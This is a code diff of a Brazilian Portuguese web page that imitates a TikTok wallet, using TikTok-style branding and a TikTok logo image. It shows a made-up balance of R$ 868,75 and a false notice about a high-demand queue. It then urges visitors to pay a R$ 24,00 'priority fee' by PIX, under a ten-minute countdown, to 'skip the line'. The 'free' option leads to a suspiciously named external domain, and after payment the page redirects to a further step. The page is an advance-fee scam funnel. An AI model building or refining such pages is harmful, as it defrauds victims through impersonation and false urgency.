@@ -1,116 +1,307 @@
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Carteira - Saque</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Carteira - Saque</title>
+    <style>
+        /* Reset e Fontes */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto}
-body{background:#f8f8f8;display:flex;justify-content:center}
-.app-container{max-width:480px;width:100%;background:#fff;min-height:100vh}
-.header{display:flex;justify-content:center;align-items:center;padding:16px;border-bottom:1px solid #eee}
-.header h1{margin-left:10px;font-size:17px}
-.balance-section{text-align:center;padding:40px 20px}
-.balance-amount{font-size:42px;font-weight:700}
-.status-badge{background:#e6f6ec;color:#0bba52;padding:6px 12px;border-radius:20px;font-size:12px;margin-top:10px;display:inline-block}
-.notice{background:#fff9e6;border-left:4px solid #ffb700;padding:12px;margin:20px;font-size:13px}
-.options-container{padding:20px;display:flex;flex-direction:column;gap:15px}
-.option-card{border-radius:12px;padding:18px;cursor:pointer}
-.card-instant{border:2px solid #000;box-shadow:4px 4px 0 #fe2c55,-4px -4px 0 #25f4ee}
-.btn-instant{background:#fe2c55;color:#fff;padding:12px;border-radius:6px;text-align:center;margin-top:15px}
-.card-normal{background:#f1f1f1;opacity:.7}
-.btn-normal{border:1px solid #ccc;padding:12px;text-align:center;border-radius:6px;margin-top:15px}
+        body {
+            background-color: #f8f8f8;
+            display: flex;
+            justify-content: center;
+            color: #161823;
+        }
 
-/* MODAL */
-#pixModal{
-display:none;
-position:fixed;
-inset:0;
-background:rgba(0,0,0,0.6);
-z-index:999;
-}
+        /* Container Mobile (simulando tela de celular) */
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            background-color: #ffffff;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        }
 
-.modal-content{
-background:#fff;
-max-width:400px;
-margin:50px auto;
-padding:20px;
-border-radius:12px;
-text-align:center;
-}
+        /* Header Institucional */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            border-bottom: 1px solid #e3e3e4;
+            position: relative;
+        }
 
-.copy-btn{
-background:#fe2c55;
-color:#fff;
-border:none;
-padding:12px;
-width:100%;
-border-radius:6px;
-margin-top:15px;
-}
+        .header img {
+            height: 32px;
+            border-radius: 50%; /* Arredondando já que o logo enviado tem fundo branco/outros ícones */
+            object-fit: cover;
+            width: 32px;
+        }
 
-.timer{
-color:red;
-font-size:13px;
-margin-top:10px;
-}
-</style>
+        .header h1 {
+            font-size: 17px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        /* Seção de Saldo */
+        .balance-section {
+            text-align: center;
+            padding: 40px 20px 30px;
+        }
+
+        .balance-section p {
+            color: #73747b;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .balance-amount {
+            font-size: 42px;
+            font-weight: 700;
+            color: #161823;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        .currency {
+            font-size: 20px;
+            margin-top: 6px;
+            margin-right: 4px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background-color: #e6f6ec;
+            color: #0bba52;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            margin-top: 15px;
+        }
+
+        /* Seção de Aviso / Fila */
+        .notice {
+            background-color: #fff9e6;
+            border-left: 4px solid #ffb700;
+            padding: 12px 16px;
+            margin: 0 20px 24px;
+            font-size: 13px;
+            color: #664d00;
+            border-radius: 4px;
+            line-height: 1.4;
+        }
+
+        .options-title {
+            padding: 0 20px;
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #161823;
+        }
+
+        /* Cartões de Opção */
+        .options-container {
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .option-card {
+            text-decoration: none;
+            display: block;
+            border-radius: 12px;
+            padding: 18px;
+            position: relative;
+            transition: transform 0.1s ease;
+        }
+
+        .option-card:active {
+            transform: scale(0.98);
+        }
+
+        /* Estilo: Saque Imediato (Destaque TikTok) */
+        .card-instant {
+            background-color: #ffffff;
+            border: 2px solid #161823;
+            box-shadow: 4px 4px 0px #fe2c55, -4px -4px 0px #25f4ee; /* Sombra estilo TikTok */
+            z-index: 2;
+        }
+
+        .tag-recommended {
+            position: absolute;
+            top: -12px;
+            right: 16px;
+            background: linear-gradient(90deg, #fe2c55, #25f4ee);
+            color: white;
+            font-size: 11px;
+            font-weight: 800;
+            padding: 4px 10px;
+            border-radius: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .card-instant .card-header h2 {
+            color: #161823;
+            font-size: 18px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-instant p {
+            color: #444;
+            font-size: 13px;
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+
+        .fee-highlight {
+            display: inline-block;
+            background-color: #f1f1f2;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            color: #161823;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+
+        .btn-instant {
+            display: block;
+            width: 100%;
+            background-color: #fe2c55;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            border-radius: 6px;
+            font-weight: 600;
+            margin-top: 16px;
+            font-size: 15px;
+        }
+
+        /* Estilo: Saque Normal (Sem graça/Demorado) */
+        .card-normal {
+            background-color: #f8f8f8;
+            border: 1px solid #e3e3e4;
+            opacity: 0.85;
+        }
+
+        .card-normal .card-header h2 {
+            color: #73747b;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .card-normal p {
+            color: #8a8b91;
+            font-size: 13px;
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+
+        .btn-normal {
+            display: block;
+            width: 100%;
+            background-color: transparent;
+            color: #73747b;
+            border: 1px solid #d0d0d3;
+            text-align: center;
+            padding: 12px;
+            border-radius: 6px;
+            font-weight: 600;
+            margin-top: 16px;
+            font-size: 15px;
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="app-container">
+    <div class="app-container">
+        <!-- Header -->
+        <div class="header">
+            <img src="https://img.freepik.com/vetores-premium/conjunto-de-icones-de-aplicativos-tiktok-logotipo-de-midia-social-ilustracao-em-vetor_277909-592.jpg?semt=ais_hybrid&w=740&q=80" alt="Logo">
+            <h1>Carteira</h1>
+        </div>
 
-<div class="header">
-<h1>Carteira</h1>
-</div>
+        <!-- Saldo -->
+        <div class="balance-section">
+            <p>Saldo disponível para saque</p>
+            <div class="balance-amount">
+                <span class="currency">R$</span> 868,75
+            </div>
+            <div class="status-badge">✓ Saldo Liberado</div>
+        </div>
 
-<div class="balance-section">
-<p>Saldo disponível</p>
-<div class="balance-amount">R$ 868,75</div>
-<div class="status-badge">✓ Liberado</div>
-</div>
+        <!-- Aviso Fila -->
+        <div class="notice">
+            <strong>Aviso:</strong> Devido ao alto volume de usuários hoje, estamos com uma fila de espera para novos saques gratuitos.
+        </div>
 
-<div class="notice">
-Alta demanda hoje. Saques gratuitos estão em fila.
-</div>
+        <div class="options-title">
+            Escolha o método de recebimento:
+        </div>
 
-<div class="options-container">
+        <!-- Opções de Saque -->
+        <div class="options-container">
+            
+            <!-- OPÇÃO 1: IMEDIATO (Alta Conversão / Upsell) -->
+            <a href="javascript:void(0)" onclick="gerarPix()" class="option-card card-instant">
+                <div class="tag-recommended">Furar Fila</div>
+                <div class="card-header">
+                    <h2>⚡ Saque PIX VIP</h2>
+                </div>
+                <p>Receba seus <strong>R$ 868,75</strong> na sua conta em menos de 1 minuto, sem precisar aguardar na fila de processamento.</p>
+                <div class="fee-highlight">Taxa de prioridade: R$ 24,00</div>
+                <div class="btn-instant">Receber Saldo AGORA</div>
+            </a>
 
-<!-- BOTÃO PRINCIPAL -->
-<div class="option-card card-instant" onclick="gerarPix()">
-<h2>⚡ Saque PIX VIP</h2>
-<p>Receba em menos de 1 minuto</p>
-<div class="btn-instant">Receber AGORA</div>
-</div>
+            <!-- OPÇÃO 2: DEMORADO (De graça) -->
+            <a href="https://offeersegurooo.vercel.app/up02" class="option-card card-normal">
+                <div class="card-header">
+                    <h2>⏳ Saque Padrão</h2>
+                </div>
+                <p>Entre na fila de processamento. O valor cairá na sua conta em <strong>até 7 dias úteis</strong>.</p>
+                <div class="fee-highlight" style="background: transparent; padding:0; color: #73747b;">Taxa: Grátis</div>
+                <div class="btn-normal">Aguardar 7 dias</div>
+            </a>
 
-<div class="option-card card-normal">
-<h2>⏳ Saque normal</h2>
-<p>Até 7 dias úteis</p>
-<div class="btn-normal">Aguardar</div>
-</div>
-
-</div>
-</div>
-
+        </div>
+    </div>
 <!-- MODAL PIX -->
-<div id="pixModal">
-<div class="modal-content">
+<div id="pixModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:9999;">
+    <div style="background:#fff; max-width:420px; margin:60px auto; padding:20px; border-radius:12px; text-align:center;">
+        
+        <h3 style="margin-bottom:10px;">Pague com PIX</h3>
 
-<h3>Pague com PIX</h3>
+        <img id="qrCode" style="width:250px; margin:20px auto; display:block;" />
 
-<img id="qrCode" style="width:250px;margin:20px auto;">
+        <p id="pixCode" style="font-size:12px; word-break:break-all;"></p>
 
-<p id="pixCode" style="word-break:break-all;font-size:12px;"></p>
+        <button onclick="copiarPix()" style="width:100%; background:#fe2c55; color:#fff; border:none; padding:12px; border-radius:6px; margin-top:10px;">
+            Copiar código PIX
+        </button>
 
-<button class="copy-btn" onclick="copiarPix()">Copiar código PIX</button>
+        <p id="timer" style="color:red; font-size:13px; margin-top:10px;"></p>
 
-<div class="timer" id="timer"></div>
-
-<button onclick="fecharModal()" style="margin-top:10px">Fechar</button>
-
-</div>
+        <button onclick="fecharModal()" style="margin-top:10px;">Fechar</button>
+    </div>
 </div>
 
 <script>
@@ -118,72 +309,77 @@ let transactionId = null;
 let tempo = 600;
 
 async function gerarPix(){
-const res = await fetch("/api/criar-pix",{method:"POST"});
-const data = await res.json();
+    try{
+        const res = await fetch("/api/criar-pix", { method:"POST" });
+        const data = await res.json();
 
-if(!data.pixCode){
-alert("Erro ao gerar PIX");
-return;
-}
+        if(!data.pixCode){
+            alert("Erro ao gerar PIX");
+            return;
+        }
 
-transactionId = data.transactionId;
+        transactionId = data.transactionId;
 
-document.getElementById("qrCode").src =
-"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(data.pixCode);
+        document.getElementById("qrCode").src =
+        "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(data.pixCode);
 
-document.getElementById("pixCode").innerText = data.pixCode;
+        document.getElementById("pixCode").innerText = data.pixCode;
 
-document.getElementById("pixModal").style.display="block";
+        document.getElementById("pixModal").style.display = "block";
 
-iniciarTimer();
-verificarPagamento();
+        iniciarTimer();
+        verificarPagamento();
+
+    }catch(e){
+        alert("Erro na conexão");
+    }
 }
 
 function copiarPix(){
-navigator.clipboard.writeText(document.getElementById("pixCode").innerText);
-alert("PIX copiado");
+    const text = document.getElementById("pixCode").innerText;
+    navigator.clipboard.writeText(text);
+    alert("Código PIX copiado");
 }
 
 function fecharModal(){
-document.getElementById("pixModal").style.display="none";
+    document.getElementById("pixModal").style.display = "none";
 }
 
 function iniciarTimer(){
-const el = document.getElementById("timer");
+    const el = document.getElementById("timer");
 
-const interval = setInterval(()=>{
-tempo--;
-let min = Math.floor(tempo/60);
-let sec = tempo%60;
+    const interval = setInterval(()=>{
+        tempo--;
 
-el.innerText = "Expira em: " + min + ":" + (sec<10?"0"+sec:sec);
+        let min = Math.floor(tempo/60);
+        let sec = tempo % 60;
 
-if(tempo<=0){
-clearInterval(interval);
-el.innerText="PIX expirado";
-}
-},1000);
+        el.innerText = "Expira em: " + min + ":" + (sec < 10 ? "0"+sec : sec);
+
+        if(tempo <= 0){
+            clearInterval(interval);
+            el.innerText = "PIX expirado";
+        }
+    },1000);
 }
 
 async function verificarPagamento(){
-const interval = setInterval(async ()=>{
+    const interval = setInterval(async ()=>{
+        if(!transactionId) return;
 
-if(!transactionId) return;
+        const res = await fetch("/api/status?transactionId=" + transactionId);
+        const data = await res.json();
 
-const res = await fetch("/up1/api/status?transactionId="+transactionId);
-const data = await res.json();
+        if(data.status === "COMPLETED"){
+            clearInterval(interval);
 
-if(data.status==="COMPLETED"){
-clearInterval(interval);
+            alert("Pagamento aprovado!");
 
-alert("Pagamento aprovado!");
-
-window.location.href="/sucesso.html";
-}
-
-},3000);
+            window.location.href = "/up2";
+        }
+    },3000);
 }
 </script>
-
+  
 </body>
 </html>
